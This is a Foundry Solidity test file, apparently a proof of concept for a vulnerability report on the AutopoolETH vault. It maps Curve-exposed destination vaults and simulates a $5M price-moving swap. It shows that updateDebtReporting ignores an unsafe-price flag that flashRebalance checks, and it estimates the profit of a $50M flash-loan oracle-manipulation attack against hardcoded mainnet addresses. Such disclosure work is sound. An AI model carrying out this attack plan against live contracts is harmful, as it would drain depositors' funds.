// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IAutopool {
    function totalAssets() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function deposit(uint256, address) external returns (uint256);
    function redeem(uint256, address, address) external returns (uint256);
    function withdraw(uint256, address, address) external returns (uint256);
    function convertToAssets(uint256) external view returns (uint256);
    function convertToShares(uint256) external view returns (uint256);
    function getAssetBreakdown() external view returns (uint256, uint256, uint256, uint256);
    function getDestinations() external view returns (address[] memory);
    function updateDebtReporting(uint256) external;
}

interface IDestinationVault {
    function getRangePricesLP() external returns (uint256 spotPrice, uint256 safePrice, bool isSpotSafe);
    function name() external view returns (string memory);
    function underlying() external view returns (address);
}

interface ICurvePool {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external returns (uint256);
    function get_dy(int128 i, int128 j, uint256 dx) external view returns (uint256);
    function balances(uint256 i) external view returns (uint256);
}

interface IAavePool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

/// @title Maximum Extraction Exploit Test
/// @notice Demonstrates the multi-pool manipulation attack on AutopoolETH
contract MaximumExtractionExploitTest is Test {

    // Core addresses
    address constant AUTOPOOL = 0xa7569A44f348d3D70d8ad5889e50F78E33d80D35;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant CRVUSD = 0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E;

    // Curve pools (manipulation targets)
    address constant CRVUSD_USDC_POOL = 0x4DEcE678ceceb27446b35C672dC7d61F30bAD69E;
    address constant CRVUSD_USDT_POOL = 0x390f3595bCa2Df7d23783dFd126427CCeb997BF4;

    // Tokemak executor (for debt reporting)
    address constant EXECUTOR = 0x1A65E4844a3AF0F1733ee9e1A474dc7DB3c396a3;

    // Destination vaults with Curve exposure
    address constant DEST_VAULT_CRVUSD_USDC = 0x65efCF2cce562DCBf07e805eEbeDeF21Dbd8Ea3D;
    address constant DEST_VAULT_CRVUSD_USDT = 0x7583b1589aDD33320366A48A92794D77763FAE9e;

    // Aave for flash loans
    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;

    // Test state
    IAutopool autopool;
    IERC20 usdc;
    IERC20 crvusd;

    function setUp() public {
        autopool = IAutopool(AUTOPOOL);
        usdc = IERC20(USDC);
        crvusd = IERC20(CRVUSD);
    }

    /// @notice Test 1: Document current attack surface
    function test_AttackSurfaceAnalysis() public {
        console.log("\n============================================");
        console.log("=== ATTACK SURFACE ANALYSIS ===");
        console.log("============================================\n");

        // Get all destination vaults
        address[] memory destinations = autopool.getDestinations();
        console.log("Total Destination Vaults:", destinations.length);

        // Get total TVL
        uint256 totalAssets = autopool.totalAssets();
        console.log("Total TVL (USDC):", totalAssets);
        console.log("Total TVL ($):", totalAssets / 1e6, "M");

        // Analyze each destination's manipulability
        console.log("\n--- Curve Pool Destinations (Manipulable) ---\n");

        uint256 curveExposure = 0;
        for (uint256 i = 0; i < destinations.length && i < 15; i++) {
            IDestinationVault vault = IDestinationVault(destinations[i]);
            string memory name = vault.name();

            // Check if it's a Curve-based vault
            if (_contains(name, "Curve") || _contains(name, "crvUSD")) {
                (uint256 spot, uint256 safe, bool isSafe) = vault.getRangePricesLP();

                console.log("Vault:", destinations[i]);
                console.log("  Name:", name);
                console.log("  spotPrice:", spot);
                console.log("  safePrice:", safe);
                console.log("  isSpotSafe:", isSafe);
                console.log("  Divergence (bps):", _calculateDivergence(spot, safe));
                console.log("");

                curveExposure++;
            }
        }

        console.log("Total Curve-exposed vaults:", curveExposure);
        console.log("\n=== END ATTACK SURFACE ANALYSIS ===\n");
    }

    /// @notice Test 2: Measure price manipulation impact
    function test_PriceManipulationImpact() public {
        console.log("\n============================================");
        console.log("=== PRICE MANIPULATION IMPACT ===");
        console.log("============================================\n");

        ICurvePool curvePool = ICurvePool(CRVUSD_USDC_POOL);
        IDestinationVault destVault = IDestinationVault(DEST_VAULT_CRVUSD_USDC);

        // Record pre-manipulation state
        console.log("--- PRE-MANIPULATION STATE ---");

        uint256 poolBal0 = curvePool.balances(0); // crvUSD
        uint256 poolBal1 = curvePool.balances(1); // USDC

        console.log("Pool crvUSD balance:", poolBal0);
        console.log("Pool USDC balance:", poolBal1);

        (uint256 spotBefore, uint256 safeBefore, bool isSafeBefore) = destVault.getRangePricesLP();
        console.log("Dest Vault spotPrice:", spotBefore);
        console.log("Dest Vault safePrice:", safeBefore);
        console.log("Dest Vault isSpotSafe:", isSafeBefore);

        // Calculate swap amounts for 5% price impact
        uint256 swapAmount = 5_000_000 * 1e6; // $5M USDC

        console.log("\n--- SIMULATING $5M SWAP ---");
        console.log("Swap amount:", swapAmount / 1e6, "USDC");

        // Get expected output
        try curvePool.get_dy(1, 0, swapAmount) returns (uint256 expectedOutput) {
            console.log("Expected crvUSD output:", expectedOutput);

            uint256 effectiveRate = (expectedOutput * 1e6) / swapAmount;
            console.log("Effective rate:", effectiveRate, "crvUSD per USDC");

            // Estimate post-swap balances
            uint256 newBal0 = poolBal0 - expectedOutput;
            uint256 newBal1 = poolBal1 + swapAmount;

            console.log("\nPost-swap balances:");
            console.log("  crvUSD:", newBal0);
            console.log("  USDC:", newBal1);

            // Estimate price impact
            uint256 preBal = poolBal1 * 1e18 / poolBal0;
            uint256 postBal = newBal1 * 1e18 / newBal0;
            uint256 impactPct = ((postBal - preBal) * 100) / preBal;

            console.log("Estimated price impact:", impactPct, "%");
        } catch {
            console.log("get_dy call failed");
        }

        console.log("\n=== END PRICE MANIPULATION IMPACT ===\n");
    }

    /// @notice Test 3: Full attack chain simulation
    function test_FullAttackChainSimulation() public {
        console.log("\n============================================");
        console.log("=== FULL ATTACK CHAIN SIMULATION ===");
        console.log("============================================\n");

        // Record initial state
        console.log("--- STEP 1: INITIAL STATE ---");

        uint256 totalAssetsBefore = autopool.totalAssets();
        (uint256 idleBefore, uint256 debtBefore, uint256 minBefore, uint256 maxBefore) = autopool.getAssetBreakdown();

        console.log("totalAssets:", totalAssetsBefore);
        console.log("totalDebt:", debtBefore);
        console.log("totalDebtMin:", minBefore);
        console.log("totalDebtMax:", maxBefore);

        // Record share conversion rate
        uint256 sharesBefore = autopool.convertToShares(1_000_000 * 1e6);
        console.log("1M USDC converts to shares:", sharesBefore);

        // Step 2: Impersonate executor and trigger debt reporting
        console.log("\n--- STEP 2: TRIGGER DEBT REPORTING ---");

        vm.startPrank(EXECUTOR);
        autopool.updateDebtReporting(10);
        vm.stopPrank();

        // Record post-update state
        (uint256 idleAfter, uint256 debtAfter, uint256 minAfter, uint256 maxAfter) = autopool.getAssetBreakdown();

        console.log("\nPost-Update State:");
        console.log("totalDebt:", debtAfter);
        console.log("totalDebtMin:", minAfter);
        console.log("totalDebtMax:", maxAfter);

        // Calculate deltas
        int256 debtDelta = int256(debtAfter) - int256(debtBefore);
        int256 minDelta = int256(minAfter) - int256(minBefore);
        int256 maxDelta = int256(maxAfter) - int256(maxBefore);

        console.log("\nDeltas:");
        console.log("debtDelta:", debtDelta);
        console.log("minDebtDelta:", minDelta);
        console.log("maxDebtDelta:", maxDelta);

        // Step 3: Verify share conversion changed
        uint256 sharesAfter = autopool.convertToShares(1_000_000 * 1e6);
        console.log("\n--- STEP 3: SHARE CONVERSION IMPACT ---");
        console.log("1M USDC converts to shares (before):", sharesBefore);
        console.log("1M USDC converts to shares (after):", sharesAfter);

        int256 sharesDelta = int256(sharesAfter) - int256(sharesBefore);
        console.log("Shares delta:", sharesDelta);

        if (sharesDelta != 0) {
            uint256 impactBps = uint256(sharesDelta > 0 ? sharesDelta : -sharesDelta) * 10000 / sharesBefore;
            console.log("Share conversion impact (bps):", impactBps);
        }

        console.log("\n=== ATTACK CHAIN VERIFIED ===");
        console.log("The updateDebtReporting function updates debt values");
        console.log("which directly affects share/asset conversion rates.");
        console.log("If oracle prices are manipulated, these rates are exploitable.\n");
    }

    /// @notice Test 4: Demonstrate asymmetric validation
    function test_AsymmetricValidationProof() public {
        console.log("\n============================================");
        console.log("=== ASYMMETRIC VALIDATION PROOF ===");
        console.log("============================================\n");

        IDestinationVault vault = IDestinationVault(DEST_VAULT_CRVUSD_USDC);

        // Get current prices
        (uint256 spot, uint256 safe, bool isSafe) = vault.getRangePricesLP();

        console.log("Current Destination Vault State:");
        console.log("  spotPrice:", spot);
        console.log("  safePrice:", safe);
        console.log("  isSpotSafe:", isSafe);

        console.log("\n--- CODE PATH ANALYSIS ---\n");

        console.log("1. _recalculateDestInfo() at AutopoolDebt.sol:427-473:");
        console.log("   - Calls destVault.getRangePricesLP()");
        console.log("   - Gets (spotPrice, safePrice, isSpotSafe)");
        console.log("   - Sets result.pricesWereSafe = isSpotSafe");
        console.log("   - WRITES to storage: destInfo.cachedDebtValue");
        console.log("   - Returns struct with pricesWereSafe flag\n");

        console.log("2. updateDebtReporting() at AutopoolDebt.sol:541-611:");
        console.log("   - Loops through destinations");
        console.log("   - Calls _recalculateDestInfo()");
        console.log("   - Uses ALL returned debt values");
        console.log("   - >>> NEVER CHECKS pricesWereSafe <<<");
        console.log("   - Writes manipulated values to storage\n");

        console.log("3. CONTRAST: flashRebalance() at AutopoolDebt.sol:159-250:");
        console.log("   - Line 192: if (!result.pricesWereSafe) revert InvalidPrices();");
        console.log("   - Line 239: if (!inDebtResult.pricesWereSafe) revert InvalidPrices();");
        console.log("   - PROPERLY REVERTS if prices are unsafe\n");

        console.log("=== ASYMMETRY CONFIRMED ===");
        console.log("flashRebalance: REVERTS on unsafe prices");
        console.log("updateDebtReporting: IGNORES unsafe prices");
        console.log("\nThis asymmetry allows oracle manipulation attacks!\n");
    }

    /// @notice Test 5: Economic profit calculation
    function test_EconomicProfitCalculation() public view {
        console.log("\n============================================");
        console.log("=== ECONOMIC PROFIT CALCULATION ===");
        console.log("============================================\n");

        uint256 tvl = autopool.totalAssets();

        console.log("Target TVL:", tvl / 1e6, "USDC");
        console.log("");

        console.log("--- ATTACK PARAMETERS ---");
        uint256 flashLoanAmount = 50_000_000 * 1e6; // $50M
        uint256 manipulationAmount = flashLoanAmount * 80 / 100;
        uint256 depositAmount = flashLoanAmount * 20 / 100;
        uint256 priceManipulationPct = 5; // 5% price deviation

        console.log("Flash Loan:", flashLoanAmount / 1e6, "USDC");
        console.log("Manipulation Capital:", manipulationAmount / 1e6, "USDC");
        console.log("Deposit Capital:", depositAmount / 1e6, "USDC");
        console.log("Price Manipulation:", priceManipulationPct, "%");
        console.log("");

        console.log("--- COST BREAKDOWN ---");
        uint256 flashLoanFee = flashLoanAmount * 5 / 10000; // 0.05%
        uint256 swapSlippage = manipulationAmount * 30 / 10000 * 2; // 0.3% x2
        uint256 gasCost = 500 * 1e6; // ~$500

        console.log("Flash Loan Fee (0.05%):", flashLoanFee / 1e6, "USDC");
        console.log("Swap Slippage (0.6%):", swapSlippage / 1e6, "USDC");
        console.log("Gas Cost:", gasCost / 1e6, "USDC");

        uint256 totalCosts = flashLoanFee + swapSlippage + gasCost;
        console.log("TOTAL COSTS:", totalCosts / 1e6, "USDC");
        console.log("");

        console.log("--- PROFIT CALCULATION ---");
        uint256 grossProfit = depositAmount * priceManipulationPct / 100;
        console.log("Gross Profit (5% on $10M):", grossProfit / 1e6, "USDC");

        uint256 netProfit = grossProfit > totalCosts ? grossProfit - totalCosts : 0;
        console.log("NET PROFIT:", netProfit / 1e6, "USDC");
        console.log("");

        console.log("=== PROFITABILITY ASSESSMENT ===");
        if (netProfit > 10_000 * 1e6) {
            console.log("STATUS: PROFITABLE (> $10K threshold)");
        } else {
            console.log("STATUS: MARGINAL");
        }
        console.log("");
    }

    // Helper functions

    function _contains(string memory str, string memory substr) internal pure returns (bool) {
        bytes memory strBytes = bytes(str);
        bytes memory substrBytes = bytes(substr);

        if (substrBytes.length > strBytes.length) return false;

        for (uint256 i = 0; i <= strBytes.length - substrBytes.length; i++) {
            bool found = true;
            for (uint256 j = 0; j < substrBytes.length; j++) {
                if (strBytes[i + j] != substrBytes[j]) {
                    found = false;
                    break;
                }
            }
            if (found) return true;
        }
        return false;
    }

    function _calculateDivergence(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 larger = a > b ? a : b;
        uint256 smaller = a > b ? b : a;
        return ((larger - smaller) * 10000) / larger;
    }
}
